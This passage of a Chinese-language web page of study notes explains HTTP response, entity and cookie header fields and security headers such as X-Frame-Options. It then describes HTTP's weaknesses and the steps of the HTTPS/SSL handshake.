class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。</p><h3 id="响应首部字段-1"><a href="#响应首部字段-1" class="headerlink" title="响应首部字段"></a>响应首部字段</h3><p>响应首部字段是由服务器端向客户端返回响应报文中所使用的字段， 用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。</p><h4 id="Accept-Ranges"><a href="#Accept-Ranges" class="headerlink" title="Accept-Ranges"></a>Accept-Ranges</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Ranges</span><span class="token punctuation">:</span> <span class="token header-value">bytes</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。</p><p>可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。</p><h4 id="Age"><a href="#Age" class="headerlink" title="Age"></a>Age</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Age</span><span class="token punctuation">:</span> <span class="token header-value">600</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。</p><p>若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age。</p><h4 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">ETag</span><span class="token punctuation">:</span> <span class="token header-value">"82e22293907ce725faf67773957acd12"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/0e9a820ce5a8a8b4b440975ba2efbed4.png"></p><p>仅仅是由服务器来分配。</p><h5 id="强-ETag-值"><a href="#强-ETag-值" class="headerlink" title="强 ETag 值"></a>强 <strong>ETag</strong> 值</h5><p>强 ETag 值，不论实体发生多么细微的变化都会改变其值。</p><p><code>ETag: "usagi-1234"</code></p><h5 id="弱-ETag-值"><a href="#弱-ETag-值" class="headerlink" title="弱 ETag 值"></a>弱 <strong>ETag</strong> 值</h5><p>弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。</p><p><code>ETag: W/"usagi-1234"</code></p><h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><p><img src="https://images.dadream.eu.org/images/2024/07/d427319a2e408e1a28ec464f7a19eb32.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span> <span class="token header-value">http://www.usagidesign.jp/sample.html</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。</p><p>基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。</p><h4 id="Proxy-Authenticate"><a href="#Proxy-Authenticate" class="headerlink" title="Proxy-Authenticate"></a>Proxy-Authenticate</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Proxy-Authenticate</span><span class="token punctuation">:</span> <span class="token header-value">Basic realm="Usagidesign Auth"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。</p><h4 id="Retry-After"><a href="#Retry-After" class="headerlink" title="Retry-After"></a>Retry-After</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Retry-After</span><span class="token punctuation">:</span> <span class="token header-value">120</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。</p><p>字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24 GMT 等格式），也可以是创建响应后的秒数。</p><h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">Apache/2.2.6 (Unix) PHP/5.2.5</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。</p><h4 id="Vary"><a href="#Vary" class="headerlink" title="Vary"></a>Vary</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Vary</span><span class="token punctuation">:</span> <span class="token header-value">Accept-Language</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相同，因此必须要从源服务器重新获取资源。</p><h4 id="WWW-Authenticate"><a href="#WWW-Authenticate" class="headerlink" title="WWW-Authenticate"></a>WWW-Authenticate</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">WWW-Authenticate</span><span class="token punctuation">:</span> <span class="token header-value">Basic realm="Usagidesign Auth"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中， 肯定带有首部字段 WWW-Authenticate。</p><h3 id="实体首部字段-1"><a href="#实体首部字段-1" class="headerlink" title="实体首部字段"></a>实体首部字段</h3><p>实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。</p><h4 id="Alow"><a href="#Alow" class="headerlink" title="Alow"></a>Alow</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Allow</span><span class="token punctuation">:</span> <span class="token header-value">GET, HEAD</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。</p><h4 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a>Content-Encoding</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行的压缩。</p><ul><li>gzip</li><li>compress</li><li>deflate</li><li>identity</li></ul><h4 id="Content-Languag"><a href="#Content-Languag" class="headerlink" title="Content-Languag"></a>Content-Languag</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或英文等语言）。</p><h4 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">15000</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Content-Length 表明了实体主体的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length 首部字段。</p><h4 id="Content-Location"><a href="#Content-Location" class="headerlink" title="Content-Location"></a>Content-Location</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Location</span><span class="token punctuation">:</span> <span class="token header-value">http://www.hackr.jp/index-ja.html</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。</p><p>比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段 Content-Location 内会写明 URI。</p><h4 id="Content-MD5"><a href="#Content-MD5" class="headerlink" title="Content-MD5"></a>Content-MD5</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-MD5</span><span class="token punctuation">:</span> <span class="token header-value">OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/cae670c7d7ca3bf6ff620ed7cf4fafe2.png"></p><p>首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。</p><p>对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。</p><h4 id="Content-Range"><a href="#Content-Range" class="headerlink" title="Content-Range"></a>Content-Range</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes 5001-10000/10000</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。</p><h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。</p><h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Expires</span><span class="token punctuation">:</span> <span class="token header-value">Wed, 04 Jul 2012 08:26:05 GMT</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。</p><p>当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。</p><h4 id="Last-Modified"><a href="#Last-Modified" class="headerlink" title="Last-Modified"></a>Last-Modified</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Last-Modified</span><span class="token punctuation">:</span> <span class="token header-value">Wed, 23 May 2012 09:59:55 GMT</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会变成数据最终修改时的时间。</p><h3 id="为-Cookie-服务的首部字段"><a href="#为-Cookie-服务的首部字段" class="headerlink" title="为 Cookie 服务的首部字段"></a>为 <strong>Cookie</strong> 服务的首部字段</h3><p>Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该Web网站时，可通过通信方式取回之前发放的Cookie。</p><p>调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web 站点和攻击者的攻击而泄露。</p><h4 id="Cookie-的规格标准文档"><a href="#Cookie-的规格标准文档" class="headerlink" title="Cookie 的规格标准文档"></a>Cookie 的规格标准文档</h4><ul><li><h6 id="RFC2109"><a href="#RFC2109" class="headerlink" title="RFC2109"></a>RFC2109</h6></li><li><h6 id="RFC2965"><a href="#RFC2965" class="headerlink" title="RFC2965"></a>RFC2965</h6></li><li><h6 id="RFC6265"><a href="#RFC6265" class="headerlink" title="RFC6265"></a>RFC6265</h6></li><li><p>由网景公司颁布的规格标准</p></li></ul><h4 id="Cookie-服务的首部字段"><a href="#Cookie-服务的首部字段" class="headerlink" title="Cookie 服务的首部字段"></a><strong>Cookie</strong> 服务的首部字段</h4><table><thead><tr><th>首部字段名</th><th>说明</th><th>首部类型</th></tr></thead><tbody><tr><td>Set-Cookie</td><td>开始状态管理所使用的Cookie信息</td><td>响应首部字段</td></tr><tr><td>Cookie</td><td>服务器接收到的Cookie信息</td><td>请求首部字段</td></tr></tbody></table><h4 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">status=enable; expires=Tue, 05 Jul 2011 07:26:31</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Set-Cookie</strong> 字段的属性</p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>NAME=VALUE</td><td>赋予 Cookie 的名称和其值（必需项）</td></tr><tr><td>expires=DATE</td><td>Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止）</td></tr><tr><td>path=PATH</td><td>将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</td></tr><tr><td>domain=域名</td><td>作为 Cookie 适用对象的域名  （若不指定则默认为创建 Cookie  的服务器的域名）</td></tr><tr><td>Secure</td><td>仅在 HTTPS 安全通信时才会发送  Cookie</td></tr><tr><td>HttpOnly</td><td>加以限制，使 Cookie 不能被 JavaScript 脚本访问</td></tr></tbody></table><h6 id="expires-属性"><a href="#expires-属性" class="headerlink" title="expires 属性"></a>expires 属性</h6><p>Cookie 的 expires 属性指定浏览器可发送 Cookie 的有效期。</p><p>当省略 expires 属性时，其有效期仅限于维持浏览器会话（Session） 时间段内。这通常限于浏览器应用程序被关闭之前。</p><p>另外，一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对客户端 Cookie 的实质性删除操作。</p><h5 id="path-属性"><a href="#path-属性" class="headerlink" title="path 属性"></a><strong>path</strong> 属性</h5><p>Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p><h5 id="domain-属性"><a href="#domain-属性" class="headerlink" title="domain 属性"></a><strong>domain</strong> 属性</h5><p>通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比如，当指定 example.com 后，除 example.com 以外，<a href="http://www.example.com/">www.example.com </a>或www2.example.com 等都可以发送 Cookie。</p><p>因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定domain 属性显得更安全</p><h5 id="secure-属性"><a href="#secure-属性" class="headerlink" title="secure 属性"></a><strong>secure</strong> 属性</h5><p>Cookie 的 secure 属性用于限制 Web 页面仅在 HTTPS 安全连接时，才可以发送 Cookie。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">name=value; secure</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="HttpOnly-属性"><a href="#HttpOnly-属性" class="headerlink" title="HttpOnly 属性"></a>HttpOnly 属性</h6><p>Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-site scripting，XSS）对 Cookie 的信息窃取。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">name=value; HttpOnly</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">status=enable</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。</p><h3 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h3><p>HTTP 首部字段是可以自行扩展的。</p><table><thead><tr><th>X-Frame-Options</th></tr></thead><tbody><tr><td>X-XSS-Protection</td></tr><tr><td>DNT</td></tr><tr><td>P3P</td></tr></tbody></table><h4 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-Frame-Options</span><span class="token punctuation">:</span> <span class="token header-value">DENY</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。</p><h5 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h5><ul><li><strong>DENY</strong> ：拒绝</li><li><strong>SAMEORIGIN</strong> ：仅同源域名下的页面（Top-level-browsing- context）匹配时许可。（比如，当指定 <a href="http://hackr.jp/sample.html">http://hackr.jp/sample.html </a>页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被允许可加载该页面，而 example.com 等其他域名的页面就不行了）</li></ul><h5 id="apache2-conf-的配置实例"><a href="#apache2-conf-的配置实例" class="headerlink" title="apache2.conf 的配置实例"></a><strong>apache2.conf</strong> 的配置实例</h5><pre class="line-numbers language-http" data-language="http"><code class="language-http">&lt;IfModule mod_headers.c&gt;Header append X-FRAME-OPTIONS "SAMEORIGIN"&lt;/IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-XSS-Protection</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。</p><ul><li>0：将 XSS 过滤设置成无效状态</li><li>1：将 XSS 过滤设置成有效状态</li></ul><h4 id="DNT"><a href="#DNT" class="headerlink" title="DNT"></a>DNT</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。</p><ul><li>0：同意被追踪</li><li>1：拒绝被追踪</li></ul><h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">P3P</span><span class="token punctuation">:</span> <span class="token header-value">CP="CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。</p><p>要进行 P3P 的设定，需按以下操作步骤进行。</p><p>步骤 <strong>1</strong>：创建 P3P 隐私</p><p>步骤 <strong>2</strong>：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml</p><p>步骤 <strong>3</strong>：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应中</p><h2 id="确保-Web-安全的HTTPS"><a href="#确保-Web-安全的HTTPS" class="headerlink" title="确保 Web 安全的HTTPS"></a>确保 <strong>Web</strong> 安全的HTTPS</h2><p>在 HTTP 协议中有可能存在信息窃听或身份伪装等安全问题。使用HTTPS 通信机制可以有效地防止这些问题。</p><h3 id="HTTP的缺点"><a href="#HTTP的缺点" class="headerlink" title="HTTP的缺点"></a>HTTP的缺点</h3><ul><li><p>通信使用明文（不加密），内容可能会被窃听</p></li><li><p>不验证通信方的身份，因此有可能遭遇伪装</p></li><li><p>无法证明报文的完整性，所以有可能已遭篡改</p></li></ul><h4 id="通信使用明文（不加密），内容可能会被窃听"><a href="#通信使用明文（不加密），内容可能会被窃听" class="headerlink" title="通信使用明文（不加密），内容可能会被窃听"></a>通信使用明文（不加密），内容可能会被窃听</h4><p>由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。</p><ul><li><p><strong>TCP/IP</strong> 是可能被窃听的网络</p><p>互联网上的任何角落都存在通信内容被窃听的风险</p><p>即使加密的处理过的通信任会被监听，只是监听者还需要破解报文信息</p></li><li><p>加密处理防止被窃听</p><ul><li><p>通信的加密</p><p>HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。</p></li><li><p>内容的加密</p><p>HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。</p><p>把HTTP 报文里所含的内容进行加密处理。</p></li></ul></li></ul><p><img src="https://images.dadream.eu.org/images/2024/07/ebf75f3e4a4d5757e3628065a63e4971.png"></p><h4 id="不验证通信方的身份就可能遭遇伪装"><a href="#不验证通信方的身份就可能遭遇伪装" class="headerlink" title="不验证通信方的身份就可能遭遇伪装"></a>不验证通信方的身份就可能遭遇伪装</h4><p>HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。</p><h5 id="任何人都可发起请求"><a href="#任何人都可发起请求" class="headerlink" title="任何人都可发起请求"></a>任何人都可发起请求</h5><p>HTTP 协议的实现本身非常简单，不论是谁发送过来的请求都会返回响应。</p><ul><li>无法判断发出的请求是否到达理想服务器，伪装服务器</li><li>无法判断响应是理想客服端发来的，伪造客服端</li><li>无法判断对方是否具有访问权限</li><li>无法判断是否会发给理想客户端</li></ul><h5 id="查明对手的证书"><a href="#查明对手的证书" class="headerlink" title="查明对手的证书"></a>查明对手的证书</h5><p>虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段， 可用于确定方。</p><p><img src="https://images.dadream.eu.org/images/2024/07/5b8c38026530678e13e723170dad0f13.png"></p><h4 id="无法证明报文完整性，可能已遭篡改"><a href="#无法证明报文完整性，可能已遭篡改" class="headerlink" title="无法证明报文完整性，可能已遭篡改"></a>无法证明报文完整性，可能已遭篡改</h4><p>所谓完整性是指信息的准确度。</p><h5 id="接收到的内容可能有误"><a href="#接收到的内容可能有误" class="headerlink" title="接收到的内容可能有误"></a>接收到的内容可能有误</h5><p>在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。</p><p><img src="https://images.dadream.eu.org/images/2024/07/6b6927be25adafe4f71d33db42272962.png"></p><h5 id="如何防止篡改"><a href="#如何防止篡改" class="headerlink" title="如何防止篡改"></a>如何防止篡改</h5><p>其中常用的是 MD5 和 SHA-1 等散列值校验的方法， 以及用来确认文件的数字签名方法。这些算法也会被改写。</p><h3 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+ 加密 + 认证 + 完整性保护**=HTTPS**"></a><strong>HTTP+</strong> 加密 <strong>+</strong> 认证 <strong>+</strong> 完整性保护**=HTTPS**</h3><h4 id="HTTP-加上加密处理和认证以及完整性保护后即是HTTPS"><a href="#HTTP-加上加密处理和认证以及完整性保护后即是HTTPS" class="headerlink" title="HTTP 加上加密处理和认证以及完整性保护后即是HTTPS"></a><strong>HTTP</strong> 加上加密处理和认证以及完整性保护后即是HTTPS</h4><p>把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTP Secure）。</p><p><img src="https://images.dadream.eu.org/images/2024/07/e837127d056258e30e3e134a207e6791.png"></p><h4 id="HTTPS-是身披-SSL-外壳的-HTTP"><a href="#HTTPS-是身披-SSL-外壳的-HTTP" class="headerlink" title="HTTPS 是身披 SSL 外壳的 HTTP"></a><strong>HTTPS</strong> 是身披 <strong>SSL</strong> 外壳的 <strong>HTTP</strong></h4><p><img src="https://images.dadream.eu.org/images/2024/07/140c9e47c4065dfc522e3e412df99331.png"></p><h4 id="相互交换密钥的公开密钥加密技术"><a href="#相互交换密钥的公开密钥加密技术" class="headerlink" title="相互交换密钥的公开密钥加密技术"></a>相互交换密钥的公开密钥加密技术</h4><p>SSL 采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。</p><ul><li>共享密钥加密的困境</li><li>使用两把密钥的公开密钥加密</li><li><strong>HTTPS</strong> 采用混合加密机制</li></ul><h4 id="证明公开密钥正确性的证书"><a href="#证明公开密钥正确性的证书" class="headerlink" title="证明公开密钥正确性的证书"></a>证明公开密钥正确性的证书</h4><p><img src="https://images.dadream.eu.org/images/2024/07/a60a859278525e0944814a22d2dc2c4a.png"></p><ul><li><p>可证明组织真实性的 <strong>EV SSL</strong> 证书</p><p>证书的一个作用是用来证明作为通信一方的服务器是否规范，另外一个作用是可确认对方服务器背后运营的企业是否真实存在。拥有该特性的证书就是 EV SSL 证书（Extended Validation SSL Certificate）。</p></li><li><p>用以确认客户端的客户端证书</p><p>HTTPS 中还可以使用客户端证书。以客户端证书进行客户端认证，证明服务器正在通信的对方始终是预料之内的客户端，其作用跟服务器证书如出一辙。</p></li><li><p>认证机构信誉第一</p></li><li><p>由自认证机构颁发的证书称为自签名证书</p></li></ul><h4 id="HTTPS-的安全通信机制"><a href="#HTTPS-的安全通信机制" class="headerlink" title="HTTPS 的安全通信机制"></a><strong>HTTPS</strong> 的安全通信机制</h4><p><img src="https://images.dadream.eu.org/images/2024/07/8fd4f672653f4ee626fa9d20a1ed5f5c.png"></p><p>步骤 <strong>1</strong>： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</p><p>步骤 <strong>2</strong>： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。</p><p>步骤 <strong>3</strong>： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。</p><p>步骤 <strong>4</strong>： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</p><p>步骤 <strong>5</strong>： SSL 第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</p><p>步骤 <strong>6</strong>： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。</p><p>步骤 <strong>7</strong>： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。</p><p>步骤 <strong>8</strong>： 服务器同样发送 Change Cipher Spec 报文。</p><p>步骤 <strong>9</strong>： 服务器同样发送 Finished 报文。</p><p>步骤 <strong>10</strong>： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。</p><p>步骤 <strong>11</strong>： 应用层协议通信，即发送 HTTP 响应。</p><p>步骤 <strong>12</strong>： 最后由客户端断开连接。断开连接时，发送 close_notify 报文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP 的通信。</p><p>在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。</p><p><img 